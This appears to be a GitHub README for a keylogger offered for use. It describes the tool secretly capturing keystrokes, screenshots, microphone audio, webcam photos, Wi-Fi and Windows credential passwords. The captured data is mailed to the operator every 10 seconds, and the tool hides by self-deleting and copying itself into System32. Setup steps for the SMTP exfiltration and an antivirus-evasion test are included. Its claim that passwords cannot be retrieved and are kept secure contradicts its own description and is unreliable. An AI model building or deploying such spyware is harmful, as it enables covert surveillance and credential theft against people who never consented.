# What Does This Keylogger Do? 🤔
* First 10 seconds you get **System Information, IP Information, Local Users Information** and **Wifi passwords** from target computer and send to your mail.

* 2nd and other mails (every 10 seconds) you get **Keyboard Inputs**, **Mouse Coordinates**, **ScreenShot**, **Microphone Recording** and **Photo (if target has a WebCam)** from target computer and send to your mail.

* If the target finds the code and opens the file, the program **Deletes** itself.

* ***The aim of the project is to test the security of Operating Systems.***

# INSTALLATION
```
pip install -r requirements.txt
```

# About Getting Credentials

* ***Windows OS*** saves **Web Credentials** and **Windows Credentials** in the **Credential Manager.**

* However, the program may encounter some errors while decoding user passwords, so passwords are decoded in JSON format.

* If some passwords are still not decoded, you can decode them with the `decode.py`

* Please note that is not possible anyway retrieve or save user passwords in hashed or plaintext form using methods provided by the Windows API or other legal means.

* User passwords are sensitive information and are handled with the highest level of security.

# ⚠️ Warning ⚠️

* You need to run the script as administrator because the script copies itself to `C:\Windows\System32`

* Also, remember that **even the higher-level** file copying functions like `shutil.copy()` and `shutil.copy2()` can't copy all file metadata.

* On Windows, file owners, Access Control Lists (ACLs) and alternate data streams are not copied.

# USAGE 🐣

* Create an account on https://mailtrap.io/ to use a temp mail.

* Click on ***Show Credentials*** to see your **Username** and **Password.**

![image](https://github.com/isPique/Keylogger/assets/139041426/840ab983-424b-4407-a6ba-697abf2f3dfb)

* After clicking on ***Show Credentials*** set your own **SMTP Username** and **SMTP Password** on `keylogger.py`

![image](https://github.com/isPique/Keylogger/assets/139041426/2c0a42b0-477e-4bb0-86ae-352e446bdc3d)

* Then create an account on https://ipinfo.io/ to get your **Access Token.**

![image](https://github.com/isPique/Keylogger/assets/139041426/45c987b1-4781-4468-9672-672e43b58672)

* After you have set up the token in your ipinfo account, you are done! ✔

# Antivirus Test

![image](https://github.com/isPique/Keylogger/assets/139041426/7755e46f-bb73-4f6e-977d-0d1a8a927c4f)
